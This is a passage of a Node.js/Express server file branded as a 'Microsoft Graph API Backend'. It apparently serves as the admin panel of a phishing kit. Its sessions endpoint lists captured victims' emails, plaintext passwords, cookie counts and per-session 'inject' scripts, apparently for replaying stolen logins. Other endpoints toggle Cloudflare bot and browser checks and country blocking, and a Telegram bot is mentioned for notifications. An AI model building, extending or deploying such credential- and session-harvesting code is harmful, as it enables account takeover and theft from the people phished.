    } catch (error) {
        console.error('Error parsing URL:', error);
        return null;
    }
}

// Helper function to validate email
function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// Admin sessions endpoint with session data
app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
    try {
        const sessionDir = path.join(__dirname, 'session_data');
        let allSessions = [];

        if (fs.existsSync(sessionDir)) {
            const files = fs.readdirSync(sessionDir);

            // Load valid sessions
            files.filter(file => file.startsWith('session_') && file.endsWith('.json'))
                .forEach(file => {
                    try {
                        const sessionData = JSON.parse(fs.readFileSync(path.join(sessionDir, file), 'utf8'));
                        allSessions.push({
                            id: sessionData.sessionId || sessionData.id,
                            email: sessionData.email,
                            timestamp: sessionData.timestamp,
                            status: 'valid',
                            password: sessionData.password,
                            totalCookies: sessionData.totalCookies,
                            injectFilename: `inject_session_${sessionData.sessionId || sessionData.id}.js`
                        });
                    } catch (e) {
                        console.warn('Error parsing session file:', file);
                    }
                });

            // Load invalid sessions
            files.filter(file => file.startsWith('invalid_') && file.endsWith('.json'))
                .forEach(file => {
                    try {
                        const invalidData = JSON.parse(fs.readFileSync(path.join(sessionDir, file), 'utf8'));
                        allSessions.push({
                            id: invalidData.id,
                            email: invalidData.email,
                            timestamp: invalidData.timestamp,
                            status: 'invalid',
                            reason: invalidData.reason,
                            errorMessage: invalidData.errorMessage,
                            failureType: invalidData.failureType // Include failureType
                        });
                    } catch (e) {
                        console.warn('Error parsing invalid session file:', file);
                    }
                });
        }

        // Sort by timestamp (newest first)
        allSessions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

        res.json({
            sessions: allSessions,
            totalSessions: allSessions.length,
            analytics: analytics
        });
    } catch (error) {
        console.error('Error loading sessions:', error);
        res.status(500).json({
            error: 'Failed to load sessions',
            details: error.message
        });
    }
});

// Admin endpoint to revoke session
app.delete('/api/admin/session/:sessionId', requireAdminAuth, (req, res) => {
    const sessionId = req.params.sessionId;

    if (userSessions.has(sessionId)) {
        userSessions.delete(sessionId);
        res.json({ 
            success: true, 
            message: `Session ${sessionId} revoked` 
        });
    } else {
        res.status(404).json({ 
            error: 'Session not found' 
        });
    }
});

// Cloudflare configuration storage
let cloudflareConfig = {
    apiToken: null,    // For modern API tokens (Bearer)
    apiKey: null,      // For legacy Global API Key
    email: null,       // Required for Global API Key
    zoneId: null,
    configured: false,
    enabled: false     // Toggle to enable/disable Cloudflare features
};

// Load Cloudflare config from file if exists (silently)
const CLOUDFLARE_CONFIG_FILE = path.join(__dirname, 'cloudflare-config.json');
if (fs.existsSync(CLOUDFLARE_CONFIG_FILE)) {
    try {
        const savedConfig = JSON.parse(fs.readFileSync(CLOUDFLARE_CONFIG_FILE, 'utf8'));
        cloudflareConfig = { ...cloudflareConfig, ...savedConfig };

        // Override with environment variables if available (more secure)
        if (process.env.CLOUDFLARE_EMAIL) {
            cloudflareConfig.email = process.env.CLOUDFLARE_EMAIL;
        }

        // Only log if explicitly configured
        if (cloudflareConfig.configured && cloudflareConfig.email && cloudflareConfig.apiKey && cloudflareConfig.zoneId) {
            console.log('🌤️ Cloudflare configuration loaded and active');
        }
    } catch (error) {
        // Silent - don't warn about Cloudflare issues
    }
}

// Helper function to make Cloudflare API calls
async function callCloudflareAPI(endpoint, method = 'GET', data = null) {
    if (!cloudflareConfig.configured) {
        throw new Error('Cloudflare not configured');
    }
    
    if (!cloudflareConfig.enabled) {
        throw new Error('Cloudflare is disabled');
    }

    const url = `https://api.cloudflare.com/client/v4/zones/${cloudflareConfig.zoneId}${endpoint}`;
    const headers = {
        'Content-Type': 'application/json'
    };

    // Support both modern API tokens (Bearer) and legacy Global API Key
    if (cloudflareConfig.apiToken) {
        // Modern API Token
        headers['Authorization'] = `Bearer ${cloudflareConfig.apiToken}`;
    } else if (cloudflareConfig.apiKey && cloudflareConfig.email) {
        // Legacy Global API Key
        headers['X-Auth-Email'] = cloudflareConfig.email;
        headers['X-Auth-Key'] = cloudflareConfig.apiKey;
    } else {
        throw new Error('Cloudflare authentication credentials missing');
    }

    const options = {
        method: method,
        headers: headers
    };

    if (data && (method === 'POST' || method === 'PUT' || method === 'PATCH')) {
        options.body = JSON.stringify(data);
    }

    const response = await fetch(url, options);
    const result = await response.json();

    if (!result.success) {
        throw new Error(result.errors?.[0]?.message || 'Cloudflare API error');
    }

    return result;
}

// Cloudflare management endpoints
app.get('/api/admin/cloudflare/status', requireAdminAuth, async (req, res) => {
    try {
        if (!cloudflareConfig.configured) {
            return res.json({
                success: false,
                configured: false,
                error: 'Cloudflare not configured',
                message: 'Configure Cloudflare API credentials to enable management features'
            });
        }

        // Get zone settings
        const [botFightResult, securityResult, browserCheckResult] = await Promise.all([
            callCloudflareAPI('/settings/bot_fight_mode'),
            callCloudflareAPI('/settings/security_level'),
            callCloudflareAPI('/settings/browser_check')
        ]);

        res.json({
            success: true,
            configured: true,
            settings: {
                botFightMode: botFightResult.result.value === 'on',
                securityLevel: securityResult.result.value,
                browserCheck: browserCheckResult.result.value === 'on'
            }
        });

    } catch (error) {
        // Silent fail when Cloudflare is disabled or not configured
        res.json({
            success: false,
            configured: cloudflareConfig.configured,
            error: 'Failed to get Cloudflare status',
            message: error.message
        });
    }
});

app.post('/api/admin/cloudflare/configure', requireAdminAuth, async (req, res) => {
    try {
        const { apiToken, apiKey, email, zoneId } = req.body;

        // Validate input - support both modern API tokens and legacy Global API Key
        if (!zoneId) {
            return res.status(400).json({
                success: false,
                error: 'Zone ID is required'
            });
        }

        if (!apiToken && (!apiKey || !email)) {
            return res.status(400).json({
                success: false,
                error: 'Either API token OR (Global API key + email) are required'
            });
        }

        // Create test config based on provided credentials
        const testConfig = { zoneId, configured: true };
        if (apiToken) {
            testConfig.apiToken = apiToken;
        } else {
            testConfig.apiKey = apiKey;
            testConfig.email = email;
        }

        const originalConfig = { ...cloudflareConfig };
        cloudflareConfig = testConfig;

        try {
            await callCloudflareAPI('');

            // Save configuration to file
            fs.writeFileSync(CLOUDFLARE_CONFIG_FILE, JSON.stringify(testConfig, null, 2));
            console.log('🌤️ Cloudflare configuration saved successfully');

            res.json({
                success: true,
                message: 'Cloudflare configured successfully'
            });

        } catch (testError) {
            // Restore original config on test failure
            cloudflareConfig = originalConfig;
            throw new Error(`Invalid credentials: ${testError.message}`);
        }

    } catch (error) {
        console.error('Cloudflare configuration error:', error.message);
        res.json({
            success: false,
            error: 'Configuration failed',
            message: error.message
        });
    }
});

app.post('/api/admin/cloudflare/bot-fight', requireAdminAuth, async (req, res) => {
    try {
        const { enabled } = req.body;

        await callCloudflareAPI('/settings/bot_fight_mode', 'PATCH', {
            value: enabled ? 'on' : 'off'
        });

        console.log(`🤖 Bot Fight Mode ${enabled ? 'enabled' : 'disabled'}`);

        res.json({
            success: true,
            enabled: enabled,
            message: `Bot Fight Mode ${enabled ? 'enabled' : 'disabled'}`
        });

    } catch (error) {
        console.error('Bot Fight Mode error:', error.message);
        res.json({
            success: false,
            error: 'Failed to update Bot Fight Mode',
            message: error.message
        });
    }
});

app.post('/api/admin/cloudflare/security-level', requireAdminAuth, async (req, res) => {
    try {
        const { level } = req.body;
        const validLevels = ['off', 'essentially_off', 'low', 'medium', 'high', 'under_attack'];

        if (!validLevels.includes(level)) {
            return res.status(400).json({
                success: false,
                error: 'Invalid security level'
            });
        }

        await callCloudflareAPI('/settings/security_level', 'PATCH', {
            value: level
        });

        console.log(`🔒 Security Level set to: ${level}`);

        res.json({
            success: true,
            level: level,
            message: `Security Level set to ${level}`
        });

    } catch (error) {
        console.error('Security Level error:', error.message);
        res.json({
            success: false,
            error: 'Failed to update Security Level',
            message: error.message
        });
    }
});

app.post('/api/admin/cloudflare/browser-check', requireAdminAuth, async (req, res) => {
    try {
        const { enabled } = req.body;

        await callCloudflareAPI('/settings/browser_check', 'PATCH', {
            value: enabled ? 'on' : 'off'
        });

        console.log(`🌐 Browser Check ${enabled ? 'enabled' : 'disabled'}`);

        res.json({
            success: true,
            enabled: enabled,
            message: `Browser Check ${enabled ? 'enabled' : 'disabled'}`
        });

    } catch (error) {
        console.error('Browser Check error:', error.message);
        res.json({
            success: false,
            error: 'Failed to update Browser Check',
            message: error.message
        });
    }
});

// Cloudflare country rules endpoints
app.get('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, res) => {
    try {
        if (!cloudflareConfig.configured) {
            return res.json({
                success: true,
                rules: [],
                configured: false,
                message: 'Cloudflare not configured - no country rules available'
            });
        }

        // Get firewall rules from Cloudflare
        const rulesResult = await callCloudflareAPI('/firewall/rules');
        
        // Filter for country-based rules
        const countryRules = rulesResult.result.filter(rule => 
            rule.filter && rule.filter.expression && rule.filter.expression.includes('ip.geoip.country')
        );

        res.json({
            success: true,
            rules: countryRules,
            configured: true
        });

    } catch (error) {
        console.error('Error fetching country rules:', error.message);
        res.json({
            success: false,
            rules: [],
            configured: cloudflareConfig.configured,
            error: 'Failed to fetch country rules',
            message: error.message
        });
    }
});

app.post('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, res) => {
    try {
        const { countries, action, description } = req.body;

        if (!countries || !Array.isArray(countries) || countries.length === 0) {
            return res.status(400).json({
                success: false,
                error: 'Countries array is required'
            });
        }

        if (!action || !['block', 'challenge', 'allow'].includes(action)) {
            return res.status(400).json({
                success: false,
                error: 'Valid action required (block, challenge, or allow)'
            });
        }

        // Create Cloudflare firewall rule expression
        const countryList = countries.map(c => `"${c}"`).join(' ');
        const expression = `(ip.geoip.country in {${countryList}})`;

        // Create filter first
        const filterResult = await callCloudflareAPI('/filters', 'POST', [{
            expression: expression,
            description: description || `Country rule for ${countries.join(', ')}`
        }]);

        if (!filterResult.result || filterResult.result.length === 0) {
            throw new Error('Failed to create filter');
        }

        const filterId = filterResult.result[0].id;

        // Create firewall rule using the filter
        const ruleResult = await callCloudflareAPI('/firewall/rules', 'POST', [{
            filter: { id: filterId },
            action: action,
            description: description || `Country rule for ${countries.join(', ')}`
        }]);

        console.log(`🌍 Created Cloudflare country rule: ${action} for ${countries.join(', ')}`);

        res.json({
            success: true,
            rule: ruleResult.result[0],
            message: `Country rule created successfully`
        });

    } catch (error) {
        console.error('Error creating country rule:', error.message);
        res.json({
            success: false,
            error: 'Failed to create country rule',
            message: error.message
        });
    }
});

app.delete('/api/admin/cloudflare/country-rules/:ruleId', requireAdminAuth, async (req, res) => {
    try {
        const { ruleId } = req.params;

        if (!ruleId) {
            return res.status(400).json({
                success: false,
                error: 'Rule ID is required'
            });
        }

        // Get the rule to find its filter ID
        const ruleResult = await callCloudflareAPI(`/firewall/rules/${ruleId}`);
        const filterId = ruleResult.result.filter?.id;

        // Delete the firewall rule
        await callCloudflareAPI(`/firewall/rules/${ruleId}`, 'DELETE');

        // Delete the associated filter if it exists
        if (filterId) {
            try {
                await callCloudflareAPI(`/filters/${filterId}`, 'DELETE');
            } catch (filterError) {
                console.warn('Failed to delete filter:', filterError.message);
            }
        }

        console.log(`🗑️ Deleted Cloudflare country rule: ${ruleId}`);

        res.json({
            success: true,
            message: 'Country rule deleted successfully'
        });

    } catch (error) {
        console.error('Error deleting country rule:', error.message);
        res.json({
            success: false,
            error: 'Failed to delete country rule',
            message: error.message
        });
    }
});


// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log('🚀 Microsoft Graph API Backend running on port', PORT);
    console.log('📧 API endpoints available at http://localhost:' + PORT + '/api/');
    console.log('🌐 Frontend available at http://localhost:' + PORT + '/');
    console.log('🔧 Admin panel available at http://localhost:' + PORT + '/ad.html');

    // Check Azure configuration
    if (process.env.AZURE_CLIENT_ID && process.env.AZURE_CLIENT_SECRET && process.env.AZURE_TENANT_ID) {
        console.log('✅ Azure credentials configured - Graph API ready');
    } else {
        console.log('⚠️ Azure credentials missing - Please configure AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, and AZURE_TENANT_ID');
    }

    // Display admin token information
    if (process.env.ADMIN_TOKEN) {
        console.log('🔑 Using custom ADMIN_TOKEN from environment');
    } else {
        console.log('🔑 Generated admin token:', ADMIN_TOKEN);
        console.log('💡 Set ADMIN_TOKEN in .env file for persistent access');
    }

    if (!telegramBot) {
        console.log('❌ Telegram Bot disabled - Add TELEGRAM_BOT_TOKEN to enable notifications');
    } else {
        console.log('🤖 Admin token available via Telegram bot - Use /start to access');
    }
});